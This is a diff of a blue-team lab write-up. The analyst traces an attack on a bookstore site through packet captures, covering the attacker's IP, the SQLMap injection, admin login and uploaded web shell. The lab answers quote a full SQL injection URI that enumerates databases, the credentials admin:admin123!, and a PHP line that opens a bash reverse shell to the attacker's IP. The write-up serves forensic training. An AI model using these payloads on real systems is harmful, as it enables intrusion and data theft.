@@ -37,7 +37,7 @@ As the lead analyst on this case, you are required to analyze the network traffi
 
 # Question:
 
-- Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and
+### Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and
 ```c
 - Determine the extent of the attack, 
 - The duration of the attack, and 
@@ -48,6 +48,7 @@ As the lead analyst on this case, you are required to analyze the network traffi
 Can you provide the attacker's IP?
 
 Going to `Conversations`:
+
 ![](/assets/img/Pasted image 20240724215040.png)
 
 	- This Ip address is have so much connections on IP address 73.124.22.88.
@@ -66,7 +67,7 @@ Why would this be the case?
 -> Answer: `111.224.250.131`
 
 
-- Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?
+### Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?
 
 ![](/assets/img/Pasted image 20240724215801.png)
 
@@ -84,7 +85,7 @@ Longitude: 114.465 deg
 ```
 
 
-- Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable script name?
+### Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable script name?
 
 From the previous questions, we figured out that the tools used by the attacker are:
 ```c
@@ -94,12 +95,15 @@ From the previous questions, we figured out that the tools used by the attacker 
 ```
 
 At this stage of the chain, it is most likely that we have to find the script coming from `SQLMap`. Since that is the case, most SQL Injection exists in the URL. Let's filter all those packets:
+
 ![](/assets/img/Pasted image 20240724222608.png)
 
 Its not this:
+
 ![](/assets/img/Pasted image 20240724222701.png)
 
 Let's look further:
+
 ![](/assets/img/Pasted image 20240724222746.png)
 
 	- Nope, this is for image files.
@@ -115,7 +119,7 @@ http.user_agent contains "sql"
 
 -> Answer: `search.php`
 
-- Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the ***first*** SQLi attempt by the attacker?
+### Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the ***first*** SQLi attempt by the attacker?
 
 First SQLi attempt with `SQLMap`:
 ```c
@@ -140,9 +144,10 @@ Vulnerabilities:
 ```
 
 
-- Q5: Can you provide the complete request URI that was used to read the web server available databases?
+### Q5: Can you provide the complete request URI that was used to read the web server available databases?
 
 For this question, its better to look at the requests made on the webserver:
+
 ![](/assets/img/Pasted image 20240724225703.png)
 
 	- Then select 'Request'
@@ -174,9 +179,11 @@ ip.src == 73.124.22.98 && ip.dst == 111.224.250.131 && http.response.code == 200
 
 Other findings:
 `(a)` List of books:
+
 ![](/assets/img/Pasted image 20240725121321.png)
 
 `(b)` Not sure what exactly is the output for this one:
+
 ![](/assets/img/Pasted image 20240725121535.png)
 
 ![](/assets/img/Pasted image 20240725121616.png)
@@ -185,6 +192,7 @@ Other findings:
 
 
 `(c)` Found the sql query!:
+
 ![](/assets/img/Pasted image 20240725121829.png)
 
 
@@ -192,13 +200,14 @@ Other findings:
 -> Answer: `http://bookworldstore.com/search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-`
 
 
-- Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the ***table*** name containing the website users data?
+### Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the ***table*** name containing the website users data?
 
 ![](/assets/img/Pasted image 20240725122006.png)
 
 -> Answer: `customers`
 
 `=>` More findings on table **customers**:
+
 ![](/assets/img/Pasted image 20240725122245.png)
 
 ```c
@@ -210,6 +219,7 @@ Columns inside table 'customers':
 
 
 `=>` Credential found `admin:admin123!`: I'd say, this was found on the table '**admin**'
+
 ![](/assets/img/Pasted image 20240725122415.png)
 
 
@@ -217,6 +227,7 @@ Columns inside table 'customers':
 
 
 Following the stream:
+
 ![](/assets/img/Pasted image 20240725123222.png)
 
 
@@ -237,9 +248,11 @@ Addresses found and associated email + First and Last name of user + Number(?not
 
 
 From table `books`:
+
 ![](/assets/img/Pasted image 20240725123822.png)
 
 Following this stream:
+
 ![](/assets/img/Pasted image 20240725123851.png)
 
 List of books:
@@ -270,41 +283,45 @@ List of books:
 ```
 
 
-
-
-- Q7: The website directories hidden from the public could serve as an ***unauthorized access point*** or contain sensitive functionalities not intended for public access. Can you provide name of the directory discovered by the attacker?
+### Q7: The website directories hidden from the public could serve as an ***unauthorized access point*** or contain sensitive functionalities not intended for public access. Can you provide name of the directory discovered by the attacker?
 
 Start of admin login attempt:
+
 ![](/assets/img/Pasted image 20240725124208.png)
 
 First failed login attempt:
+
 ![](/assets/img/Pasted image 20240725124259.png)
 
 
 First successful login attempt:
+
 ![](/assets/img/Pasted image 20240725124415.png)
 
 
 -> Answer: `/admin/`
 
 
-- Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What's the credentials used by the attacker for logging in?
+### Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What's the credentials used by the attacker for logging in?
 
 Checking which credentials was used for this by following the stream:
+
 ![](/assets/img/Pasted image 20240725124538.png)
 
 
 -> Answer: `admin:admin123!`
 
 
-- Q9: We need to determine if the attacker gained further access or control on our web server. What's the name of the malicious script uploaded by the attacker?
+### Q9: We need to determine if the attacker gained further access or control on our web server. What's the name of the malicious script uploaded by the attacker?
 
 There's a single packet for this one:
+
 ![](/assets/img/Pasted image 20240724221404.png)
 
 	- Let's apply the filter by right-clicking + Apply as filter
 
 Digging into this packet:
+
 ![](/assets/img/Pasted image 20240724221645.png)
 
 	- It seems to be the packet related to file upload 'NVri2vhp.php' which contains this code:
@@ -319,6 +336,7 @@ exec("/bin/ bash -c 'bash-i >& /dev/tcp"111.224.250.131"/443 0>&1'");
 
 
 Execution of the uploaded file:
+
 ![](/assets/img/Pasted image 20240725125521.png)
 
 
